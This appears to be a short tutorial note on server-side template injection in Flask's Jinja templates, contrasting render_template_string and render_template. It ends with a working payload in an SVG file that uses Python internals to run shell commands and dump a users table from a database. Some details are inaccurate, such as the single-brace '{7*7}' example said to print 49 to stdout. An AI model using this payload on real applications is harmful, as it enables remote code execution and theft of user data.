# Jinja SSTI

Basically there are two functions in flask(it uses the jinja templating engine) render_template and render_template_string which is vulnerable to SSTI, In render template string what you give is just the template itself so if you have control over this statement basically you have template injection and a payload like {{7*7}} would evaluated as python code and would return 49 into standard output.In a nutshell its something like this 
```py
render_template_string("{7*7}");
``` 
would return 49 to stdout.

Now render_template function takes in a file which already has some predefined palceholders where out value will be placed so its first argument would be a filename and this second argument would be the string that we want to give to the placeholder and example would be like this

```html
<!-- index.html -->
<h1>Welcome!</h1>
      {% if file_link %}
      <p>File uploaded: <a href="{{ file_link }}">{{ file_link }}</a></p>
      {% endif %}

```

Now the python code to render the template would be render_template("index.html",file_link=link);
this will render the corresponding file link that we give, to render_template.

render_template is also vulnerable to SSTI if the file that it is reading from has templates in it, like we should be able to control the file other than that we can't have SSTI in render_template, a vulnerable render_template() would be as follows.

```py
render_template("sol.svg")
```
and the contents of sol.svg would be the payload for template injection.

```xml
<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>
<text>{{ self.__init__.__globals__.__builtins__.__import__('os').popen("python -c 'import sqlite3;con = "+'sqlite3.connect("user.db");cur = con.cursor();print(cur.execute("SELECT * FROM users").fetchone())'+"'").read() }}</text>
```